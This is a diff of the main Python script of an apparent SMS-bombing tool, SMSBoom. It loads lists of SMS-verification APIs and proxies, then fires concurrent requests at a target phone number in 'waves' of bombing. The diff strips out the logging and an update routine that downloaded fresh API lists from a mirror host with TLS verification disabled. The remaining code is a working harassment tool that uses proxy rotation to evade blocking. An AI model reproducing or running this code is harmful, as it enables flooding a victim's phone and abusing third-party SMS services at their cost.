@@ -1,8 +1,6 @@
 # encoding=utf8
 # 短信测压主程序
 
-from utils import default_header_user_agent
-from utils.log import logger
 from utils.models import API
 from utils.req import reqFunc, reqFuncByProxy, runAsync
 from concurrent.futures import ThreadPoolExecutor
@@ -11,9 +9,6 @@ import asyncio
 import json
 import pathlib
 import sys
-import time
-import click
-import httpx
 import os
 
 temp = 0
@@ -52,7 +47,6 @@ def load_proxies() -> list:
                         proxy_all.append({'all://': 'socks4://' + proxy})
         else:
             f_obj.touch()
-    logger.success(f"代理列表加载完成,代理数:{len(proxy_all)}")
     return proxy_all
 
 
@@ -62,7 +56,6 @@ def load_json() -> List[API]:
     """
     json_path = pathlib.Path(path, 'api.json')
     if not json_path.exists():
-        logger.error("Json file not exists!")
         raise ValueError
 
     with open(json_path.resolve(), mode="r", encoding="utf8") as j:
@@ -72,10 +65,8 @@ def load_json() -> List[API]:
                 API(**data)
                 for data in datas
             ]
-            logger.success(f"api.json 加载完成 接口数:{len(APIs)}")
             return APIs
         except Exception as why:
-            logger.error(f"Json file syntax error:{why}")
             raise ValueError
 
 
@@ -85,16 +76,13 @@ def load_getapi() -> list:
     """
     json_path = pathlib.Path(path, 'GETAPI.json')
     if not json_path.exists():
-        logger.error("GETAPI.json file not exists!")
         raise ValueError
 
     with open(json_path.resolve(), mode="r", encoding="utf8") as j:
         try:
             datas = json.loads(j.read())
-            logger.success(f"GETAPI加载完成,数目:{len(datas)}")
             return datas
         except Exception as why:
-            logger.error(f"Json file syntax error:{why}")
             raise ValueError
 
 
@@ -115,21 +103,15 @@ def runboom(phone: Union[str, tuple], enable_proxy: bool = False):
         # fix: by Ethan
         if not _proxies:
             if enable_proxy:
-                logger.error("无法读取任何代理....请取消-e")
                 sys.exit(1)
             _proxies = [None]
     except ValueError:
-        logger.error("读取接口出错!正在重新下载接口数据!....")
-        update()
         sys.exit(1)
 
     with ThreadPoolExecutor(max_workers=64) as pool:
         for i in range(1, 1 + 1):
-            logger.success(f"第{i}波轰炸开始！")
             # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
             for proxy in _proxies:
-                logger.success(f"第{i}波轰炸 - 当前正在使用代理：" +
-                                proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波开始轰炸...")
                 # 不可用的代理或API过多可能会影响轰炸效果
                 for api in _api:
                     pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(
@@ -164,27 +146,4 @@ def oneRun(phone):
             reqFunc(api, phone)
         except:
             pass
-
-
-def update():
-    """从 github 获取最新接口"""
-    GETAPI_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/GETAPI.json"
-    API_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/api.json"
-    logger.info(f"正在从GitHub拉取最新接口!")
-    try:
-        with httpx.Client(verify=False, timeout=10) as client:
-            GETAPI_json = client.get(
-                GETAPI_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")
-            api_json = client.get(
-                API_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")
-
-    except Exception as why:
-        logger.error(f"拉取更新失败:{why}请关闭所有代理软件多尝试几次!")
-    else:
-        with open(pathlib.Path(path, "GETAPI.json").absolute(), mode="w", encoding="utf8") as a:
-            a.write(GETAPI_json)
-        with open(pathlib.Path(path, "api.json").absolute(), mode="w", encoding="utf8") as a:
-            a.write(api_json)
-        logger.success(f"接口更新成功!")
-
 
